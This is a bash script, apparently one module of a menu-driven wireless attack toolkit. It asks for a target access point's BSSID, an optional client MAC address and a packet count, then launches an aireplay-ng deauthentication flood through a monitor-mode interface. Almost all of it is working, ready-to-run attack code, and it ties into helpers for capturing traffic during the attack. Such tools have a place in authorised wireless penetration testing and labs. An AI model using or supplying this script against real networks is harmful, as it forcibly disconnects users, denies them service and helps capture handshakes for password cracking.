#!/bin/bash

source Attacks/common.sh

# Color & style constants
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# Require root privileges
require_root

# Main menu prompt
prompt_to_continue() {
    local options=("Start Deauth Attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}           Deauthentication attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} Deauthentication attacks won't work on WPA3."
    echo -e "${RED}[!]${NC} Make sure you have monitor mode turned on."
    echo
    echo -e "${GREEN}[*]${NC} Available options:"
    echo
    for i in "${!options[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} ${options[$i]}"
        sleep 0.1
    done
    echo -e "  ${GREEN}[0]${NC} Go back"
    echo

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Choose an option:") " opt
        case "$opt" in
            1) break ;;  
            0) go_back ;;  
            *) echo -e "${RED}[!]${NC} Invalid. Choose 0 or 1."; sleep 0.3 ;;
        esac
    done
}

# Gather target details & run deauth
deauthentication_attack() {
    clear
    echo -e "${GREEN}[*]${NC} Enter target details:"

    # BSSID
    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} BSSID (XX:XX:XX:XX:XX:XX):") " bssid
        [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && break
        echo -e "${RED}[!]${NC} Invalid BSSID."; sleep 0.3
    done
    echo -e "${GREEN}[✓]${NC} BSSID set: $bssid"

    # Client MAC
    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Client MAC (optional):") " client
        [[ -z "$client" || "$client" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && break
        echo -e "${RED}[!]${NC} Invalid MAC."; sleep 0.3
    done
    echo -e "${GREEN}[✓]${NC} Client set: $client"

    # Packet count
    while true; do 
        read -rp "$(echo -e "${GREEN}[?]${NC} Number of deauth packets:") " packets
        [[ "$packets" =~ ^[0-9]+$ ]] && break
        echo -e "${RED}[!]${NC} Invalid number."; sleep 0.3
    done
    echo -e "${GREEN}[✓]${NC} Packets: $packets"
    read -rp "$(echo -e "${GREEN}[*]${NC} Press Enter to start attack.") "

    # Launch attack
    if [[ -z "$client" ]]; then
        sudo aireplay-ng --deauth "$packets" -a "$bssid" "$MONITOR_INTERFACE"
    else
        sudo aireplay-ng --deauth "$packets" -a "$bssid" -c "$client" "$MONITOR_INTERFACE"
    fi
    echo -e "${GREEN}[✓]${NC} Attack complete."; sleep 0.5
}

# Repeat or go back (stop capture then menu)
after_attack_options() {
    echo -e "${GREEN}[*]${NC} Choose next operation:"
    echo
    echo -e "  ${GREEN}[1]${NC} New deauth attack"
    echo -e "  ${GREEN}[0]${NC} Main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Select an option: ")" opt
        case $opt in
            1) clear; deauthentication_attack; after_attack_options; break ;;  
            0) ask_stop_capture; go_back ;;
            *) echo -e "${RED}[!]${NC} Type 0 or 1."; sleep 0.3
        esac
    done
}

# Entry point
main() {
    clear
    prompt_to_continue
    check_monitor_interfaces
    ask_capture_choice
    deauthentication_attack
    after_attack_options
}

main